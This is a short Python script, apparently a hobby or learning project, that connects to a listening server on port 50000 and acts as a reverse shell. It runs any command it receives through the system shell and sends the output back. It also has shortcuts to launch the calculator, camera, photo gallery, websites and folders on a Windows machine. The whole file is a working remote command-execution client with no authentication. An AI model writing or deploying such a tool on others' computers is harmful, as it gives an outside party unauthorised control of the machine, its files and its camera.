

import sys
import socket
import subprocess

# SERVER = "192.168.1.221"
SERVER = "127.0.0.1"  # Change this to the server's IP if running on different machines
PORT = 50000

s = socket.socket()
s.connect((SERVER, PORT))
msg = s.recv(1024).decode()
print('[*] server:', msg)

while True:
    cmd = s.recv(1024).decode()
    print(f'[+] received command: {cmd}')
    
    if cmd.lower() in ['q', 'quit', 'x', 'exit']:
        break

    try:
        if cmd.lower() == 'calc':
            subprocess.Popen('calc')
        elif cmd.lower() == 'camera':
            subprocess.Popen('start microsoft.windows.camera:', shell=True)
        elif cmd.lower() == 'youtube':
            subprocess.Popen('start https://www.youtube.com', shell=True)
        elif cmd.lower() == 'gallery':
            subprocess.Popen('start ms-photos:', shell=True)
        elif cmd.lower() == 'google':
            subprocess.Popen('start https://www.google.com', shell=True)
        elif cmd.lower().startswith('open '):  # Check if command starts with "open "
            folder_path = cmd.split(' ', 1)[1]  # Extract folder path from command
            subprocess.Popen(f'explorer "{folder_path}"')  # Open folder in Explorer
        else:
            result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
            s.send(result)
            continue  # Skip sending empty result in case of non-matching commands
    except subprocess.CalledProcessError as e:
        result = f"Command '{cmd}' failed with error: {e.output}".encode()
        s.send(result)
    except Exception as e:
        result = str(e).encode()
        s.send(result)

    s.send('[+] Executed'.encode())

s.close()
